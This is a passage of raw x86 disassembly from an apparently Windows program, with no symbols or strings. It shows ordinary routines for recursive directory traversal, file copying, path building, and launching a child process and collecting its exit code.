  404770:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  404774:	89 34 24             	mov    %esi,(%esp)
  404777:	e8 3c 61 00 00       	call   0x40a8b8
  40477c:	89 2c 24             	mov    %ebp,(%esp)
  40477f:	e8 14 61 00 00       	call   0x40a898
  404784:	81 c4 2c 20 00 00    	add    $0x202c,%esp
  40478a:	b8 01 00 00 00       	mov    $0x1,%eax
  40478f:	5b                   	pop    %ebx
  404790:	5e                   	pop    %esi
  404791:	5f                   	pop    %edi
  404792:	5d                   	pop    %ebp
  404793:	c3                   	ret
  404794:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  40479a:	8d bf 00 00 00 00    	lea    0x0(%edi),%edi
  4047a0:	56                   	push   %esi
  4047a1:	53                   	push   %ebx
  4047a2:	31 f6                	xor    %esi,%esi
  4047a4:	83 ec 14             	sub    $0x14,%esp
  4047a7:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  4047ab:	83 bb 68 40 00 00 01 	cmpl   $0x1,0x4068(%ebx)
  4047b2:	74 1c                	je     0x4047d0
  4047b4:	8d 83 68 20 00 00    	lea    0x2068(%ebx),%eax
  4047ba:	89 04 24             	mov    %eax,(%esp)
  4047bd:	e8 0e ff ff ff       	call   0x4046d0
  4047c2:	85 c0                	test   %eax,%eax
  4047c4:	74 1a                	je     0x4047e0
  4047c6:	c7 83 68 40 00 00 01 	movl   $0x1,0x4068(%ebx)
  4047cd:	00 00 00 
  4047d0:	83 c4 14             	add    $0x14,%esp
  4047d3:	89 f0                	mov    %esi,%eax
  4047d5:	5b                   	pop    %ebx
  4047d6:	5e                   	pop    %esi
  4047d7:	c3                   	ret
  4047d8:	90                   	nop
  4047d9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4047e0:	c7 04 24 f8 d2 40 00 	movl   $0x40d2f8,(%esp)
  4047e7:	be ff ff ff ff       	mov    $0xffffffff,%esi
  4047ec:	e8 1f d6 ff ff       	call   0x401e10
  4047f1:	eb dd                	jmp    0x4047d0
  4047f3:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4047f9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  404800:	55                   	push   %ebp
  404801:	57                   	push   %edi
  404802:	b8 5c 12 00 00       	mov    $0x125c,%eax
  404807:	56                   	push   %esi
  404808:	53                   	push   %ebx
  404809:	e8 d2 5d 00 00       	call   0x40a5e0
  40480e:	29 c4                	sub    %eax,%esp
  404810:	8b 84 24 70 12 00 00 	mov    0x1270(%esp),%eax
  404817:	8d ac 24 4f 02 00 00 	lea    0x24f(%esp),%ebp
  40481e:	89 2c 24             	mov    %ebp,(%esp)
  404821:	89 44 24 04          	mov    %eax,0x4(%esp)
  404825:	e8 8e 60 00 00       	call   0x40a8b8
  40482a:	89 2c 24             	mov    %ebp,(%esp)
  40482d:	e8 96 60 00 00       	call   0x40a8c8
  404832:	89 c2                	mov    %eax,%edx
  404834:	89 84 24 2c 01 00 00 	mov    %eax,0x12c(%esp)
  40483b:	0f b6 94 14 4e 02 00 	movzbl 0x24e(%esp,%edx,1),%edx
  404842:	00 
  404843:	80 fa 5c             	cmp    $0x5c,%dl
  404846:	74 09                	je     0x404851
  404848:	80 fa 2f             	cmp    $0x2f,%dl
  40484b:	0f 85 af 00 00 00    	jne    0x404900
  404851:	8d 9c 24 34 01 00 00 	lea    0x134(%esp),%ebx
  404858:	ba 2a 00 00 00       	mov    $0x2a,%edx
  40485d:	66 89 54 05 00       	mov    %dx,0x0(%ebp,%eax,1)
  404862:	89 2c 24             	mov    %ebp,(%esp)
  404865:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  404869:	ff 15 e4 f2 41 00    	call   *0x41f2e4
  40486f:	83 f8 ff             	cmp    $0xffffffff,%eax
  404872:	89 84 24 28 01 00 00 	mov    %eax,0x128(%esp)
  404879:	74 66                	je     0x4048e1
  40487b:	89 e7                	mov    %esp,%edi
  40487d:	89 de                	mov    %ebx,%esi
  40487f:	b9 46 00 00 00       	mov    $0x46,%ecx
  404884:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404886:	89 e8                	mov    %ebp,%eax
  404888:	8b 94 24 2c 01 00 00 	mov    0x12c(%esp),%edx
  40488f:	e8 9c 00 00 00       	call   0x404930
  404894:	eb 23                	jmp    0x4048b9
  404896:	8d 76 00             	lea    0x0(%esi),%esi
  404899:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  4048a0:	89 e7                	mov    %esp,%edi
  4048a2:	89 de                	mov    %ebx,%esi
  4048a4:	b9 46 00 00 00       	mov    $0x46,%ecx
  4048a9:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4048ab:	89 e8                	mov    %ebp,%eax
  4048ad:	8b 94 24 2c 01 00 00 	mov    0x12c(%esp),%edx
  4048b4:	e8 77 00 00 00       	call   0x404930
  4048b9:	8b 84 24 28 01 00 00 	mov    0x128(%esp),%eax
  4048c0:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  4048c4:	89 04 24             	mov    %eax,(%esp)
  4048c7:	ff 15 ec f2 41 00    	call   *0x41f2ec
  4048cd:	85 c0                	test   %eax,%eax
  4048cf:	74 cf                	je     0x4048a0
  4048d1:	8b 84 24 28 01 00 00 	mov    0x128(%esp),%eax
  4048d8:	89 04 24             	mov    %eax,(%esp)
  4048db:	ff 15 e0 f2 41 00    	call   *0x41f2e0
  4048e1:	8b 84 24 70 12 00 00 	mov    0x1270(%esp),%eax
  4048e8:	89 04 24             	mov    %eax,(%esp)
  4048eb:	e8 88 60 00 00       	call   0x40a978
  4048f0:	81 c4 5c 12 00 00    	add    $0x125c,%esp
  4048f6:	5b                   	pop    %ebx
  4048f7:	5e                   	pop    %esi
  4048f8:	5f                   	pop    %edi
  4048f9:	5d                   	pop    %ebp
  4048fa:	c3                   	ret
  4048fb:	90                   	nop
  4048fc:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  404900:	b9 5c 00 00 00       	mov    $0x5c,%ecx
  404905:	66 89 4c 05 00       	mov    %cx,0x0(%ebp,%eax,1)
  40490a:	83 c0 01             	add    $0x1,%eax
  40490d:	89 2c 24             	mov    %ebp,(%esp)
  404910:	89 84 24 2c 01 00 00 	mov    %eax,0x12c(%esp)
  404917:	e8 ac 5f 00 00       	call   0x40a8c8
  40491c:	e9 30 ff ff ff       	jmp    0x404851
  404921:	eb 0d                	jmp    0x404930
  404923:	90                   	nop
  404924:	90                   	nop
  404925:	90                   	nop
  404926:	90                   	nop
  404927:	90                   	nop
  404928:	90                   	nop
  404929:	90                   	nop
  40492a:	90                   	nop
  40492b:	90                   	nop
  40492c:	90                   	nop
  40492d:	90                   	nop
  40492e:	90                   	nop
  40492f:	90                   	nop
  404930:	55                   	push   %ebp
  404931:	57                   	push   %edi
  404932:	b9 02 00 00 00       	mov    $0x2,%ecx
  404937:	56                   	push   %esi
  404938:	53                   	push   %ebx
  404939:	bf 2c d3 40 00       	mov    $0x40d32c,%edi
  40493e:	89 c5                	mov    %eax,%ebp
  404940:	83 ec 1c             	sub    $0x1c,%esp
  404943:	8d 5c 24 44          	lea    0x44(%esp),%ebx
  404947:	89 de                	mov    %ebx,%esi
  404949:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
  40494b:	0f 97 c1             	seta   %cl
  40494e:	89 ce                	mov    %ecx,%esi
  404950:	0f 92 c1             	setb   %cl
  404953:	89 f0                	mov    %esi,%eax
  404955:	38 c8                	cmp    %cl,%al
  404957:	74 10                	je     0x404969
  404959:	bf 2e d3 40 00       	mov    $0x40d32e,%edi
  40495e:	b9 03 00 00 00       	mov    $0x3,%ecx
  404963:	89 de                	mov    %ebx,%esi
  404965:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
  404967:	75 08                	jne    0x404971
  404969:	83 c4 1c             	add    $0x1c,%esp
  40496c:	5b                   	pop    %ebx
  40496d:	5e                   	pop    %esi
  40496e:	5f                   	pop    %edi
  40496f:	5d                   	pop    %ebp
  404970:	c3                   	ret
  404971:	c6 44 15 00 00       	movb   $0x0,0x0(%ebp,%edx,1)
  404976:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  40497a:	89 2c 24             	mov    %ebp,(%esp)
  40497d:	e8 3e 5f 00 00       	call   0x40a8c0
  404982:	f6 44 24 30 10       	testb  $0x10,0x30(%esp)
  404987:	89 2c 24             	mov    %ebp,(%esp)
  40498a:	75 14                	jne    0x4049a0
  40498c:	e8 cf 5f 00 00       	call   0x40a960
  404991:	85 c0                	test   %eax,%eax
  404993:	74 d4                	je     0x404969
  404995:	89 e8                	mov    %ebp,%eax
  404997:	e8 94 fb ff ff       	call   0x404530
  40499c:	eb cb                	jmp    0x404969
  40499e:	66 90                	xchg   %ax,%ax
  4049a0:	e8 5b fe ff ff       	call   0x404800
  4049a5:	eb c2                	jmp    0x404969
  4049a7:	89 f6                	mov    %esi,%esi
  4049a9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  4049b0:	8b 44 24 04          	mov    0x4(%esp),%eax
  4049b4:	80 b8 68 20 00 00 00 	cmpb   $0x0,0x2068(%eax)
  4049bb:	75 03                	jne    0x4049c0
  4049bd:	f3 c3                	repz ret
  4049bf:	90                   	nop
  4049c0:	05 68 20 00 00       	add    $0x2068,%eax
  4049c5:	89 44 24 04          	mov    %eax,0x4(%esp)
  4049c9:	e9 32 fe ff ff       	jmp    0x404800
  4049ce:	66 90                	xchg   %ax,%ax
  4049d0:	57                   	push   %edi
  4049d1:	56                   	push   %esi
  4049d2:	b8 40 20 00 00       	mov    $0x2040,%eax
  4049d7:	53                   	push   %ebx
  4049d8:	e8 03 5c 00 00       	call   0x40a5e0
  4049dd:	29 c4                	sub    %eax,%esp
  4049df:	8b 84 24 50 20 00 00 	mov    0x2050(%esp),%eax
  4049e6:	8d 7c 24 40          	lea    0x40(%esp),%edi
  4049ea:	8d 9c 24 40 10 00 00 	lea    0x1040(%esp),%ebx
  4049f1:	8d 74 24 1c          	lea    0x1c(%esp),%esi
  4049f5:	89 3c 24             	mov    %edi,(%esp)
  4049f8:	89 44 24 04          	mov    %eax,0x4(%esp)
  4049fc:	e8 b7 5e 00 00       	call   0x40a8b8
  404a01:	8b 84 24 54 20 00 00 	mov    0x2054(%esp),%eax
  404a08:	89 1c 24             	mov    %ebx,(%esp)
  404a0b:	89 44 24 04          	mov    %eax,0x4(%esp)
  404a0f:	e8 a4 5e 00 00       	call   0x40a8b8
  404a14:	89 1c 24             	mov    %ebx,(%esp)
  404a17:	c7 44 24 04 31 d3 40 	movl   $0x40d331,0x4(%esp)
  404a1e:	00 
  404a1f:	e8 bc 5e 00 00       	call   0x40a8e0
  404a24:	85 c0                	test   %eax,%eax
  404a26:	89 c3                	mov    %eax,%ebx
  404a28:	0f 84 82 00 00 00    	je     0x404ab0
  404a2e:	66 90                	xchg   %ax,%ax
  404a30:	89 f9                	mov    %edi,%ecx
  404a32:	8b 01                	mov    (%ecx),%eax
  404a34:	83 c1 04             	add    $0x4,%ecx
  404a37:	8d 90 ff fe fe fe    	lea    -0x1010101(%eax),%edx
  404a3d:	f7 d0                	not    %eax
  404a3f:	21 c2                	and    %eax,%edx
  404a41:	81 e2 80 80 80 80    	and    $0x80808080,%edx
  404a47:	74 e9                	je     0x404a32
  404a49:	89 d0                	mov    %edx,%eax
  404a4b:	c1 e8 10             	shr    $0x10,%eax
  404a4e:	f7 c2 80 80 00 00    	test   $0x8080,%edx
  404a54:	0f 44 d0             	cmove  %eax,%edx
  404a57:	8d 41 02             	lea    0x2(%ecx),%eax
  404a5a:	0f 44 c8             	cmove  %eax,%ecx
  404a5d:	00 d2                	add    %dl,%dl
  404a5f:	83 d9 03             	sbb    $0x3,%ecx
  404a62:	29 f9                	sub    %edi,%ecx
  404a64:	8d 44 0f 01          	lea    0x1(%edi,%ecx,1),%eax
  404a68:	c6 04 0f 5c          	movb   $0x5c,(%edi,%ecx,1)
  404a6c:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  404a70:	89 04 24             	mov    %eax,(%esp)
  404a73:	e8 40 5e 00 00       	call   0x40a8b8
  404a78:	c7 44 24 04 31 d3 40 	movl   $0x40d331,0x4(%esp)
  404a7f:	00 
  404a80:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  404a87:	e8 54 5e 00 00       	call   0x40a8e0
  404a8c:	85 c0                	test   %eax,%eax
  404a8e:	89 c3                	mov    %eax,%ebx
  404a90:	74 1e                	je     0x404ab0
  404a92:	89 74 24 04          	mov    %esi,0x4(%esp)
  404a96:	89 3c 24             	mov    %edi,(%esp)
  404a99:	e8 82 5b 00 00       	call   0x40a620
  404a9e:	85 c0                	test   %eax,%eax
  404aa0:	79 8e                	jns    0x404a30
  404aa2:	89 3c 24             	mov    %edi,(%esp)
  404aa5:	e8 c6 5e 00 00       	call   0x40a970
  404aaa:	eb 84                	jmp    0x404a30
  404aac:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  404ab0:	89 74 24 04          	mov    %esi,0x4(%esp)
  404ab4:	89 3c 24             	mov    %edi,(%esp)
  404ab7:	e8 64 5b 00 00       	call   0x40a620
  404abc:	85 c0                	test   %eax,%eax
  404abe:	74 20                	je     0x404ae0
  404ac0:	89 3c 24             	mov    %edi,(%esp)
  404ac3:	c7 44 24 04 65 d3 40 	movl   $0x40d365,0x4(%esp)
  404aca:	00 
  404acb:	e8 a0 e3 ff ff       	call   0x402e70
  404ad0:	81 c4 40 20 00 00    	add    $0x2040,%esp
  404ad6:	5b                   	pop    %ebx
  404ad7:	5e                   	pop    %esi
  404ad8:	5f                   	pop    %edi
  404ad9:	c3                   	ret
  404ada:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  404ae0:	89 7c 24 04          	mov    %edi,0x4(%esp)
  404ae4:	c7 04 24 34 d3 40 00 	movl   $0x40d334,(%esp)
  404aeb:	e8 80 d3 ff ff       	call   0x401e70
  404af0:	eb ce                	jmp    0x404ac0
  404af2:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  404af9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  404b00:	57                   	push   %edi
  404b01:	56                   	push   %esi
  404b02:	b8 10 10 00 00       	mov    $0x1010,%eax
  404b07:	53                   	push   %ebx
  404b08:	e8 d3 5a 00 00       	call   0x40a5e0
  404b0d:	29 c4                	sub    %eax,%esp
  404b0f:	8b 84 24 20 10 00 00 	mov    0x1020(%esp),%eax
  404b16:	c7 44 24 04 68 d3 40 	movl   $0x40d368,0x4(%esp)
  404b1d:	00 
  404b1e:	89 04 24             	mov    %eax,(%esp)
  404b21:	e8 4a e3 ff ff       	call   0x402e70
  404b26:	89 c3                	mov    %eax,%ebx
  404b28:	8b 84 24 28 10 00 00 	mov    0x1028(%esp),%eax
  404b2f:	89 44 24 04          	mov    %eax,0x4(%esp)
  404b33:	8b 84 24 24 10 00 00 	mov    0x1024(%esp),%eax
  404b3a:	89 04 24             	mov    %eax,(%esp)
  404b3d:	e8 8e fe ff ff       	call   0x4049d0
  404b42:	85 c0                	test   %eax,%eax
  404b44:	89 c7                	mov    %eax,%edi
  404b46:	0f 84 b9 00 00 00    	je     0x404c05
  404b4c:	85 db                	test   %ebx,%ebx
  404b4e:	0f 84 b1 00 00 00    	je     0x404c05
  404b54:	8d 74 24 10          	lea    0x10(%esp),%esi
  404b58:	90                   	nop
  404b59:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  404b60:	89 1c 24             	mov    %ebx,(%esp)
  404b63:	e8 18 5e 00 00       	call   0x40a980
  404b68:	85 c0                	test   %eax,%eax
  404b6a:	0f 85 91 00 00 00    	jne    0x404c01
  404b70:	89 5c 24 0c          	mov    %ebx,0xc(%esp)
  404b74:	c7 44 24 08 01 00 00 	movl   $0x1,0x8(%esp)
  404b7b:	00 
  404b7c:	c7 44 24 04 00 10 00 	movl   $0x1000,0x4(%esp)
  404b83:	00 
  404b84:	89 34 24             	mov    %esi,(%esp)
  404b87:	e8 fc 5c 00 00       	call   0x40a888
  404b8c:	83 f8 ff             	cmp    $0xffffffff,%eax
  404b8f:	74 51                	je     0x404be2
  404b91:	89 7c 24 0c          	mov    %edi,0xc(%esp)
  404b95:	c7 44 24 08 01 00 00 	movl   $0x1,0x8(%esp)
  404b9c:	00 
  404b9d:	c7 44 24 04 00 10 00 	movl   $0x1000,0x4(%esp)
  404ba4:	00 
  404ba5:	89 34 24             	mov    %esi,(%esp)
  404ba8:	e8 f3 5c 00 00       	call   0x40a8a0
  404bad:	89 3c 24             	mov    %edi,(%esp)
  404bb0:	e8 fb 5c 00 00       	call   0x40a8b0
  404bb5:	85 c0                	test   %eax,%eax
  404bb7:	74 a7                	je     0x404b60
  404bb9:	89 3c 24             	mov    %edi,(%esp)
  404bbc:	be ff ff ff ff       	mov    $0xffffffff,%esi
  404bc1:	e8 c2 5d 00 00       	call   0x40a988
  404bc6:	89 1c 24             	mov    %ebx,(%esp)
  404bc9:	e8 c2 5c 00 00       	call   0x40a890
  404bce:	89 3c 24             	mov    %edi,(%esp)
  404bd1:	e8 ba 5c 00 00       	call   0x40a890
  404bd6:	89 f0                	mov    %esi,%eax
  404bd8:	81 c4 10 10 00 00    	add    $0x1010,%esp
  404bde:	5b                   	pop    %ebx
  404bdf:	5e                   	pop    %esi
  404be0:	5f                   	pop    %edi
  404be1:	c3                   	ret
  404be2:	89 1c 24             	mov    %ebx,(%esp)
  404be5:	e8 c6 5c 00 00       	call   0x40a8b0
  404bea:	85 c0                	test   %eax,%eax
  404bec:	0f 84 6e ff ff ff    	je     0x404b60
  404bf2:	89 1c 24             	mov    %ebx,(%esp)
  404bf5:	be ff ff ff ff       	mov    $0xffffffff,%esi
  404bfa:	e8 89 5d 00 00       	call   0x40a988
  404bff:	eb c5                	jmp    0x404bc6
  404c01:	31 f6                	xor    %esi,%esi
  404c03:	eb c1                	jmp    0x404bc6
  404c05:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  404c0a:	eb cc                	jmp    0x404bd8
  404c0c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  404c10:	56                   	push   %esi
  404c11:	53                   	push   %ebx
  404c12:	83 ec 14             	sub    $0x14,%esp
  404c15:	8b 44 24 20          	mov    0x20(%esp),%eax
  404c19:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  404c20:	00 
  404c21:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  404c28:	89 44 24 04          	mov    %eax,0x4(%esp)
  404c2c:	e8 df 05 00 00       	call   0x405210
  404c31:	c7 44 24 08 08 00 00 	movl   $0x8,0x8(%esp)
  404c38:	00 
  404c39:	89 c3                	mov    %eax,%ebx
  404c3b:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  404c42:	00 
  404c43:	89 04 24             	mov    %eax,(%esp)
  404c46:	ff 15 7c f2 41 00    	call   *0x41f27c
  404c4c:	83 ec 0c             	sub    $0xc,%esp
  404c4f:	89 c6                	mov    %eax,%esi
  404c51:	89 1c 24             	mov    %ebx,(%esp)
  404c54:	e8 3f 5c 00 00       	call   0x40a898
  404c59:	83 c4 14             	add    $0x14,%esp
  404c5c:	89 f0                	mov    %esi,%eax
  404c5e:	5b                   	pop    %ebx
  404c5f:	5e                   	pop    %esi
  404c60:	c3                   	ret
  404c61:	eb 0d                	jmp    0x404c70
  404c63:	90                   	nop
  404c64:	90                   	nop
  404c65:	90                   	nop
  404c66:	90                   	nop
  404c67:	90                   	nop
  404c68:	90                   	nop
  404c69:	90                   	nop
  404c6a:	90                   	nop
  404c6b:	90                   	nop
  404c6c:	90                   	nop
  404c6d:	90                   	nop
  404c6e:	90                   	nop
  404c6f:	90                   	nop
  404c70:	31 c0                	xor    %eax,%eax
  404c72:	c3                   	ret
  404c73:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  404c79:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  404c80:	57                   	push   %edi
  404c81:	56                   	push   %esi
  404c82:	b8 a0 20 00 00       	mov    $0x20a0,%eax
  404c87:	53                   	push   %ebx
  404c88:	e8 53 59 00 00       	call   0x40a5e0
  404c8d:	29 c4                	sub    %eax,%esp
  404c8f:	8b 84 24 b0 20 00 00 	mov    0x20b0(%esp),%eax
  404c96:	8d b4 24 a0 00 00 00 	lea    0xa0(%esp),%esi
  404c9d:	c7 44 24 08 00 10 00 	movl   $0x1000,0x8(%esp)
  404ca4:	00 
  404ca5:	c7 44 24 3c 00 00 00 	movl   $0x0,0x3c(%esp)
  404cac:	00 
  404cad:	8d 7c 24 5c          	lea    0x5c(%esp),%edi
  404cb1:	89 34 24             	mov    %esi,(%esp)
  404cb4:	89 44 24 04          	mov    %eax,0x4(%esp)
  404cb8:	e8 53 05 00 00       	call   0x405210
  404cbd:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  404cc4:	00 
  404cc5:	c7 04 24 16 00 00 00 	movl   $0x16,(%esp)
  404ccc:	e8 bf 5c 00 00       	call   0x40a990
  404cd1:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  404cd8:	00 
  404cd9:	c7 04 24 02 00 00 00 	movl   $0x2,(%esp)
  404ce0:	e8 ab 5c 00 00       	call   0x40a990
  404ce5:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  404cec:	00 
  404ced:	c7 04 24 0f 00 00 00 	movl   $0xf,(%esp)
  404cf4:	e8 97 5c 00 00       	call   0x40a990
  404cf9:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  404d00:	00 
  404d01:	c7 04 24 15 00 00 00 	movl   $0x15,(%esp)
  404d08:	e8 83 5c 00 00       	call   0x40a990
  404d0d:	c7 44 24 40 0c 00 00 	movl   $0xc,0x40(%esp)
  404d14:	00 
  404d15:	c7 44 24 44 00 00 00 	movl   $0x0,0x44(%esp)
  404d1c:	00 
  404d1d:	c7 44 24 48 01 00 00 	movl   $0x1,0x48(%esp)
  404d24:	00 
  404d25:	89 3c 24             	mov    %edi,(%esp)
  404d28:	ff 15 60 f2 41 00    	call   *0x41f260
  404d2e:	b8 01 00 00 00       	mov    $0x1,%eax
  404d33:	83 ec 04             	sub    $0x4,%esp
  404d36:	66 89 84 24 8c 00 00 	mov    %ax,0x8c(%esp)
  404d3d:	00 
  404d3e:	a1 00 f3 41 00       	mov    0x41f300,%eax
  404d43:	c7 44 24 60 00 00 00 	movl   $0x0,0x60(%esp)
  404d4a:	00 
  404d4b:	c7 44 24 64 00 00 00 	movl   $0x0,0x64(%esp)
  404d52:	00 
  404d53:	c7 44 24 68 00 00 00 	movl   $0x0,0x68(%esp)
  404d5a:	00 
  404d5b:	c7 84 24 88 00 00 00 	movl   $0x101,0x88(%esp)
  404d62:	01 01 00 00 
  404d66:	89 04 24             	mov    %eax,(%esp)
  404d69:	e8 ba 5b 00 00       	call   0x40a928
  404d6e:	8b 1d f8 f2 41 00    	mov    0x41f2f8,%ebx
  404d74:	89 04 24             	mov    %eax,(%esp)
  404d77:	ff d3                	call   *%ebx
  404d79:	89 84 24 94 00 00 00 	mov    %eax,0x94(%esp)
  404d80:	a1 00 f3 41 00       	mov    0x41f300,%eax
  404d85:	83 c0 20             	add    $0x20,%eax
  404d88:	89 04 24             	mov    %eax,(%esp)
  404d8b:	e8 98 5b 00 00       	call   0x40a928
  404d90:	89 04 24             	mov    %eax,(%esp)
  404d93:	ff d3                	call   *%ebx
  404d95:	89 84 24 98 00 00 00 	mov    %eax,0x98(%esp)
  404d9c:	a1 00 f3 41 00       	mov    0x41f300,%eax
  404da1:	83 c0 40             	add    $0x40,%eax
  404da4:	89 04 24             	mov    %eax,(%esp)
  404da7:	e8 7c 5b 00 00       	call   0x40a928
  404dac:	89 04 24             	mov    %eax,(%esp)
  404daf:	ff d3                	call   *%ebx
  404db1:	89 84 24 9c 00 00 00 	mov    %eax,0x9c(%esp)
  404db8:	ff 15 34 f2 41 00    	call   *0x41f234
  404dbe:	8d 54 24 4c          	lea    0x4c(%esp),%edx
  404dc2:	89 7c 24 20          	mov    %edi,0x20(%esp)
  404dc6:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  404dcd:	00 
  404dce:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  404dd5:	00 
  404dd6:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  404ddd:	00 
  404dde:	89 54 24 24          	mov    %edx,0x24(%esp)
  404de2:	8d 54 24 40          	lea    0x40(%esp),%edx
  404de6:	c7 44 24 10 01 00 00 	movl   $0x1,0x10(%esp)
  404ded:	00 
  404dee:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  404df5:	00 
  404df6:	89 44 24 04          	mov    %eax,0x4(%esp)
  404dfa:	89 54 24 08          	mov    %edx,0x8(%esp)
  404dfe:	89 34 24             	mov    %esi,(%esp)
  404e01:	ff 15 20 f2 41 00    	call   *0x41f220
  404e07:	83 ec 28             	sub    $0x28,%esp
  404e0a:	85 c0                	test   %eax,%eax
  404e0c:	75 22                	jne    0x404e30
  404e0e:	c7 04 24 6c d3 40 00 	movl   $0x40d36c,(%esp)
  404e15:	e8 f6 cf ff ff       	call   0x401e10
  404e1a:	81 c4 a0 20 00 00    	add    $0x20a0,%esp
  404e20:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  404e25:	5b                   	pop    %ebx
  404e26:	5e                   	pop    %esi
  404e27:	5f                   	pop    %edi
  404e28:	c3                   	ret
  404e29:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  404e30:	8b 44 24 4c          	mov    0x4c(%esp),%eax
  404e34:	c7 44 24 04 ff ff ff 	movl   $0xffffffff,0x4(%esp)
  404e3b:	ff 
  404e3c:	89 04 24             	mov    %eax,(%esp)
  404e3f:	ff 15 ac f2 41 00    	call   *0x41f2ac
  404e45:	83 ec 08             	sub    $0x8,%esp
  404e48:	8d 44 24 3c          	lea    0x3c(%esp),%eax
  404e4c:	89 44 24 04          	mov    %eax,0x4(%esp)
  404e50:	8b 44 24 4c          	mov    0x4c(%esp),%eax
  404e54:	89 04 24             	mov    %eax,(%esp)
  404e57:	ff 15 48 f2 41 00    	call   *0x41f248
  404e5d:	83 ec 08             	sub    $0x8,%esp
  404e60:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  404e64:	81 c4 a0 20 00 00    	add    $0x20a0,%esp
  404e6a:	5b                   	pop    %ebx
  404e6b:	5e                   	pop    %esi
  404e6c:	5f                   	pop    %edi
  404e6d:	c3                   	ret
  404e6e:	90                   	nop
  404e6f:	90                   	nop
  404e70:	83 ec 3c             	sub    $0x3c,%esp
  404e73:	ff 15 4c f2 41 00    	call   *0x41f24c
  404e79:	8d 54 24 2c          	lea    0x2c(%esp),%edx
  404e7d:	c7 44 24 2c 00 00 00 	movl   $0x0,0x2c(%esp)
  404e84:	00 
  404e85:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  404e8c:	00 
  404e8d:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  404e94:	00 
  404e95:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  404e9c:	00 
  404e9d:	89 54 24 10          	mov    %edx,0x10(%esp)
  404ea1:	89 44 24 08          	mov    %eax,0x8(%esp)
  404ea5:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  404eac:	00 
  404ead:	c7 04 24 00 11 00 00 	movl   $0x1100,(%esp)
  404eb4:	ff 15 30 f2 41 00    	call   *0x41f230
  404eba:	83 ec 1c             	sub    $0x1c,%esp
  404ebd:	ba 8c d3 40 00       	mov    $0x40d38c,%edx
  404ec2:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  404ec6:	85 c0                	test   %eax,%eax
  404ec8:	0f 44 c2             	cmove  %edx,%eax
  404ecb:	83 c4 3c             	add    $0x3c,%esp
  404ece:	c3                   	ret
  404ecf:	90                   	nop
  404ed0:	55                   	push   %ebp
  404ed1:	57                   	push   %edi
  404ed2:	56                   	push   %esi
  404ed3:	53                   	push   %ebx
  404ed4:	83 ec 2c             	sub    $0x2c,%esp
  404ed7:	8b 3d b0 f2 41 00    	mov    0x41f2b0,%edi
  404edd:	8b 74 24 40          	mov    0x40(%esp),%esi
  404ee1:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  404ee8:	00 
  404ee9:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  404ef0:	00 
  404ef1:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  404ef8:	00 
  404ef9:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  404f00:	00 
  404f01:	c7 44 24 0c ff ff ff 	movl   $0xffffffff,0xc(%esp)
  404f08:	ff 
  404f09:	89 74 24 08          	mov    %esi,0x8(%esp)
  404f0d:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  404f14:	00 
  404f15:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  404f1c:	ff d7                	call   *%edi
  404f1e:	83 ec 20             	sub    $0x20,%esp
  404f21:	85 c0                	test   %eax,%eax
  404f23:	89 c5                	mov    %eax,%ebp
  404f25:	74 5b                	je     0x404f82
  404f27:	89 34 24             	mov    %esi,(%esp)
  404f2a:	e8 69 5a 00 00       	call   0x40a998
  404f2f:	8d 50 01             	lea    0x1(%eax),%edx
  404f32:	89 14 24             	mov    %edx,(%esp)
  404f35:	e8 16 59 00 00       	call   0x40a850
